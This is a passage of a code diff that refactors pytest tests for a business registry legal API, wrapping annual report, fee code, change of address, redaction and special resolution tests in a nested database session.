+        assert rv.json['errors'][0] == {'message': 'A valid business is required.'}
 
 
 def test_update_ar_with_missing_json_body_fails(session, client, jwt):
     """Assert that updating a filing with no JSON body fails."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
-                    json=None,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
+                        json=None,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
+        assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
 
-    if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
-        assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}
+        if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
+            assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}
 
-    if rv.status_code == HTTPStatus.BAD_REQUEST:
-        assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}
+        if rv.status_code == HTTPStatus.BAD_REQUEST:
+            assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}
 
 
 def test_file_ar_no_agm_coop(session, client, jwt):
     """Assert that filing AR as COOP with no AGM date fails."""
-    identifier = 'CP7654399'
-    legal_entity =factory_legal_entity(identifier,
-                                    founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                                    last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
-                                    )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+    with nested_session(session):
+        identifier = 'CP7654399'
+        legal_entity =factory_legal_entity(identifier,
+                                        founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                                        last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
+                                        )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json['errors'][0]['error'] == ('Annual General Meeting Date must be a '
-                                             'valid date when submitting an Annual Report in the current year.')
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
+        assert rv.json['errors'][0]['error'] == ('Annual General Meeting Date must be a '
+                                                'valid date when submitting an Annual Report in the current year.')
 
 
 @integration_payment
 def test_file_ar_no_agm_bcorp(session, client, jwt):
     """Assert that filing AR as BCORP with no AGM date succeeds."""
-    identifier = 'CP7654399'
-    b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
-    factory_legal_entity_mailing_address(b)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+    with nested_session(session):
+        identifier = 'CP7654399'
+        b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
+        factory_legal_entity_mailing_address(b)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = None
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
+        assert rv.status_code == HTTPStatus.CREATED
 
 
 def test_calc_annual_report_date(session, client, jwt):
     """Assert that nextAnnualReport is the anniversary of the business recognition."""
-    identifier = 'CP7654399'
-    b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
-    factory_legal_entity_mailing_address(b)
-    assert b.next_anniversary.date().isoformat() == datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        identifier = 'CP7654399'
+        b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, 'B')
+        factory_legal_entity_mailing_address(b)
+        assert b.next_anniversary.date().isoformat() == datetime.utcnow().date().isoformat()
 
 
 DISSOLUTION_VOLUNTARY_FILING = copy.deepcopy(FILING_HEADER)
@@ -1098,79 +1140,81 @@ def _get_expected_fee_code(free, filing_name, filing_json: dict, legal_type):
 def test_get_correct_fee_codes(
         session, identifier, base_filing, filing_name, orig_legal_type, free, additional_fee_codes):
     """Assert fee codes are properly assigned to filings before sending to payment."""
-    # setup
-    expected_fee_code = _get_expected_fee_code(free, filing_name, base_filing, orig_legal_type)
+    with nested_session(session):
+        # setup
+        expected_fee_code = _get_expected_fee_code(free, filing_name, base_filing, orig_legal_type)
 
-    legal_entity =None
-    if not identifier.startswith('T'):
-        legal_entity =factory_legal_entity(identifier=identifier, entity_type=orig_legal_type)
-    # set filing
-    filing = copy.deepcopy(base_filing)
-    filing['filing']['business']['identifier'] = identifier
-    filing['filing']['business']['legalType'] = orig_legal_type
-    filing['filing']['header']['name'] = filing_name
-
-    if filing_name == 'alteration':
-        filing['filing'][filing_name]['business']['legalType'] = orig_legal_type
-    elif filing_name == 'transition':
+        legal_entity =None
+        if not identifier.startswith('T'):
+            legal_entity =factory_legal_entity(identifier=identifier, entity_type=orig_legal_type)
+        # set filing
+        filing = copy.deepcopy(base_filing)
+        filing['filing']['business']['identifier'] = identifier
         filing['filing']['business']['legalType'] = orig_legal_type
-    elif filing_name == 'changeOfAddress':
-        filing['filing'][filing_name] = CHANGE_OF_ADDRESS
-    elif filing_name == 'changeOfDirectors':
-        filing['filing'][filing_name] = copy.deepcopy(CHANGE_OF_DIRECTORS)
-        if free:
-            for director in filing['filing']['changeOfDirectors']['directors']:
-                if not all(action in ['nameChanged', 'addressChanged'] for action in director.get('actions', [])):
-                    director['actions'] = ['nameChanged', 'addressChanged']
-        else:
-            assert len(filing['filing']['changeOfDirectors']['directors']) > 1
-            filing['filing']['changeOfDirectors']['directors'][0]['actions'] = ['ceased', 'nameChanged']
-            filing['filing']['changeOfDirectors']['directors'][1]['actions'] = ['nameChanged', 'addressChanged']
+        filing['filing']['header']['name'] = filing_name
 
-    # get fee code
-    fee_code = ListFilingResource._get_filing_types(legal_entity, filing)[0]['filingTypeCode']
+        if filing_name == 'alteration':
+            filing['filing'][filing_name]['business']['legalType'] = orig_legal_type
+        elif filing_name == 'transition':
+            filing['filing']['business']['legalType'] = orig_legal_type
+        elif filing_name == 'changeOfAddress':
+            filing['filing'][filing_name] = CHANGE_OF_ADDRESS
+        elif filing_name == 'changeOfDirectors':
+            filing['filing'][filing_name] = copy.deepcopy(CHANGE_OF_DIRECTORS)
+            if free:
+                for director in filing['filing']['changeOfDirectors']['directors']:
+                    if not all(action in ['nameChanged', 'addressChanged'] for action in director.get('actions', [])):
+                        director['actions'] = ['nameChanged', 'addressChanged']
+            else:
+                assert len(filing['filing']['changeOfDirectors']['directors']) > 1
+                filing['filing']['changeOfDirectors']['directors'][0]['actions'] = ['ceased', 'nameChanged']
+                filing['filing']['changeOfDirectors']['directors'][1]['actions'] = ['nameChanged', 'addressChanged']
 
-    # verify fee code
-    assert fee_code == expected_fee_code
+        # get fee code
+        fee_code = ListFilingResource._get_filing_types(legal_entity, filing)[0]['filingTypeCode']
 
-    assert all(elem in
-               map(lambda x: x['filingTypeCode'], ListFilingResource._get_filing_types(legal_entity, filing))
-               for elem in additional_fee_codes)
+        # verify fee code
+        assert fee_code == expected_fee_code
+
+        assert all(elem in
+                map(lambda x: x['filingTypeCode'], ListFilingResource._get_filing_types(legal_entity, filing))
+                for elem in additional_fee_codes)
 
 
 @integration_payment
 def test_coa_future_effective(session, client, jwt):
     """Assert future effective changes do not affect Coops, and that BCORP change of address if future-effective."""
-    coa = copy.deepcopy(FILING_HEADER)
-    coa['filing']['header']['name'] = 'changeOfAddress'
-    coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
-    coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
-    coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'
-    identifier = 'CP1234567'
-    b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None)
-    factory_legal_entity_mailing_address(b)
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=coa,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
-    assert rv.status_code == HTTPStatus.CREATED
-    # assert 'effectiveDate' not in rv.json['filing']['header']
+    with nested_session(session):
+        coa = copy.deepcopy(FILING_HEADER)
+        coa['filing']['header']['name'] = 'changeOfAddress'
+        coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
+        coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
+        coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'
+        identifier = 'CP1234567'
+        b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None)
+        factory_legal_entity_mailing_address(b)
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=coa,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
+        assert rv.status_code == HTTPStatus.CREATED
+        # assert 'effectiveDate' not in rv.json['filing']['header']
 
-    identifier = 'CP7654321'
-    bc = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, LegalEntity.EntityTypes.BCOMP.value)
-    factory_legal_entity_mailing_address(bc)
-    coa['filing']['business']['identifier'] = identifier
+        identifier = 'CP7654321'
+        bc = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, LegalEntity.EntityTypes.BCOMP.value)
+        factory_legal_entity_mailing_address(bc)
+        coa['filing']['business']['identifier'] = identifier
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=coa,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=coa,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
-    assert 'effectiveDate' in rv.json['filing']['header']
-    effective_date = parse(rv.json['filing']['header']['effectiveDate'])
-    valid_date = LegislationDatetime.tomorrow_midnight()
-    assert effective_date == valid_date
+        assert rv.status_code == HTTPStatus.CREATED
+        assert 'effectiveDate' in rv.json['filing']['header']
+        effective_date = parse(rv.json['filing']['header']['effectiveDate'])
+        valid_date = LegislationDatetime.tomorrow_midnight()
+        assert effective_date == valid_date
 
 
 @pytest.mark.parametrize(
@@ -1188,36 +1232,37 @@ def test_coa_future_effective(session, client, jwt):
 )
 def test_filing_redaction(session, client, jwt, test_name, submitter_role, jwt_role, username, expected):
     """Assert that the core filing is saved to the backing store."""
-    from legal_api.core.filing import Filing as CoreFiling
-    try:
-        identifier = 'BC1234567'
-        filing = CoreFiling()
-        filing_submission = {
-            'filing': {
-                'header': {
-                    'name': 'specialResolution',
-                    'date': '2019-04-08'
-                },
-                'specialResolution': {
-                    'resolution': 'Year challenge is hitting oppo for the win.'
-                }}}
-        user = factory_user(username)
-        legal_entity =factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, LegalEntity.EntityTypes.BCOMP.value)
-        filing.json = filing_submission
-        filing.save()
-        filing._storage.legal_entity_id = legal_entity.id
-        filing._storage.submitter_id = user.id
-        filing._storage.submitter_roles = submitter_role
-        filing.save()
-        filing_id = filing.id
+    with nested_session(session):
+        from legal_api.core.filing import Filing as CoreFiling
+        try:
+            identifier = 'BC1234567'
+            filing = CoreFiling()
+            filing_submission = {
+                'filing': {
+                    'header': {
+                        'name': 'specialResolution',
+                        'date': '2019-04-08'
+                    },
+                    'specialResolution': {
+                        'resolution': 'Year challenge is hitting oppo for the win.'
+                    }}}
+            user = factory_user(username)
+            legal_entity =factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, LegalEntity.EntityTypes.BCOMP.value)
+            filing.json = filing_submission
+            filing.save()
+            filing._storage.legal_entity_id = legal_entity.id
+            filing._storage.submitter_id = user.id
+            filing._storage.submitter_roles = submitter_role
+            filing.save()
+            filing_id = filing.id
 
-        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
-                        headers=create_header(jwt, [jwt_role], identifier))
-    except Exception as err:
-        print(err)
+            rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
+                            headers=create_header(jwt, [jwt_role], identifier))
+        except Exception as err:
+            print(err)
 
-    assert rv.status_code == HTTPStatus.OK
-    assert rv.json['filing']['header']['submitter'] == expected
+        assert rv.status_code == HTTPStatus.OK
+        assert rv.json['filing']['header']['submitter'] == expected
 
 
 @pytest.mark.parametrize(
@@ -1232,79 +1277,81 @@ def test_filing_redaction(session, client, jwt, test_name, submitter_role, jwt_r
 )
 def test_coa(session, requests_mock, client, jwt, test_name, legal_type, identifier, future_effective_date_expected):
     """Assert COA is applied correctly for entity types."""
-    coa = copy.deepcopy(FILING_HEADER)
-    coa['filing']['header']['name'] = 'changeOfAddress'
-    coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
-    coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
-    coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'
+    with nested_session(session):
+        coa = copy.deepcopy(FILING_HEADER)
+        coa['filing']['header']['name'] = 'changeOfAddress'
+        coa['filing']['changeOfAddress'] = CHANGE_OF_ADDRESS
+        coa['filing']['changeOfAddress']['offices']['registeredOffice']['deliveryAddress']['addressCountry'] = 'CA'
+        coa['filing']['changeOfAddress']['offices']['registeredOffice']['mailingAddress']['addressCountry'] = 'CA'
 
-    b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, legal_type)
-    factory_legal_entity_mailing_address(b)
-    coa['filing']['business']['identifier'] = identifier
+        b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR), None, legal_type)
+        factory_legal_entity_mailing_address(b)
+        coa['filing']['business']['identifier'] = identifier
 
-    requests_mock.post(current_app.config.get('PAYMENT_SVC_URL'),
-                       json={'id': 21322,
-                             'statusCode': 'COMPLETED',
-                             'isPaymentActionRequired': False},
-                       status_code=HTTPStatus.CREATED)
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=coa,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        requests_mock.post(current_app.config.get('PAYMENT_SVC_URL'),
+                        json={'id': 21322,
+                                'statusCode': 'COMPLETED',
+                                'isPaymentActionRequired': False},
+                        status_code=HTTPStatus.CREATED)
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=coa,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
+        assert rv.status_code == HTTPStatus.CREATED
 
-    assert 'effectiveDate' in rv.json['filing']['header']
+        assert 'effectiveDate' in rv.json['filing']['header']
 
-    if future_effective_date_expected:
-        effective_date = parse(rv.json['filing']['header']['effectiveDate'])
-        valid_date = LegislationDatetime.tomorrow_midnight()
-        assert effective_date == valid_date
+        if future_effective_date_expected:
+            effective_date = parse(rv.json['filing']['header']['effectiveDate'])
+            valid_date = LegislationDatetime.tomorrow_midnight()
+            assert effective_date == valid_date
 
-        assert 'futureEffectiveDate' in rv.json['filing']['header']
-        future_effective_date = parse(rv.json['filing']['header']['futureEffectiveDate'])
-        assert future_effective_date == valid_date
-    else:
-        assert 'futureEffectiveDate' not in rv.json['filing']['header']
+            assert 'futureEffectiveDate' in rv.json['filing']['header']
+            future_effective_date = parse(rv.json['filing']['header']['futureEffectiveDate'])
+            assert future_effective_date == valid_date
+        else:
+            assert 'futureEffectiveDate' not in rv.json['filing']['header']
 
 
 def test_rules_memorandum_in_sr(session, mocker, requests_mock, client, jwt, ):
     """Assert if both rules update in sr, and rules file key is provided"""
-    mocker.patch('legal_api.services.filings.validations.alteration.validate_pdf',
-                 return_value=[])
+    with nested_session(session):
+        mocker.patch('legal_api.services.filings.validations.alteration.validate_pdf',
+                    return_value=[])
 
-    identifier = 'CP1234567'
-    b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR*10), None, LegalEntity.EntityTypes.COOP.value)
-    factory_legal_entity_mailing_address(b)
-    sr = copy.deepcopy(CP_SPECIAL_RESOLUTION_TEMPLATE)
-    del sr['filing']['changeOfName']
-    sr['filing']['alteration'] = {}
-    sr['filing']['alteration']['rulesFileKey'] = 'some_key'
-    sr['filing']['alteration']['business'] = {
-        'legalType': 'CP'
-    }
-    sr['filing']['alteration']['rulesInResolution'] = True
+        identifier = 'CP1234567'
+        b = factory_legal_entity(identifier, (datetime.utcnow() - datedelta.YEAR*10), None, LegalEntity.EntityTypes.COOP.value)
+        factory_legal_entity_mailing_address(b)
+        sr = copy.deepcopy(CP_SPECIAL_RESOLUTION_TEMPLATE)
+        del sr['filing']['changeOfName']
+        sr['filing']['alteration'] = {}
+        sr['filing']['alteration']['rulesFileKey'] = 'some_key'
+        sr['filing']['alteration']['business'] = {
+            'legalType': 'CP'
+        }
+        sr['filing']['alteration']['rulesInResolution'] = True
 
-    sr['filing']['business']['identifier'] = identifier
+        sr['filing']['business']['identifier'] = identifier
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=sr,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json.get('errors')
-    error = 'Cannot provide both file upload and rules change in SR'
-    assert rv.json.get('errors')[0].get('error') == error
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=sr,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
+        assert rv.json.get('errors')
+        error = 'Cannot provide both file upload and rules change in SR'
+        assert rv.json.get('errors')[0].get('error') == error
 
-    sr['filing']['alteration']['memorandumFileKey'] = 'some_key'
-    sr['filing']['alteration']['memorandumInResolution'] = True
-    sr['filing']['alteration']['rulesInResolution'] = False
+        sr['filing']['alteration']['memorandumFileKey'] = 'some_key'
+        sr['filing']['alteration']['memorandumInResolution'] = True
+        sr['filing']['alteration']['rulesInResolution'] = False
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=sr,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json.get('errors')
-    error = 'Cannot provide both file upload and memorandum change in SR'
-    assert rv.json.get('errors')[0].get('error') == error
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=sr,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
+        assert rv.json.get('errors')
+        error = 'Cannot provide both file upload and memorandum change in SR'
+        assert rv.json.get('errors')[0].get('error') == error
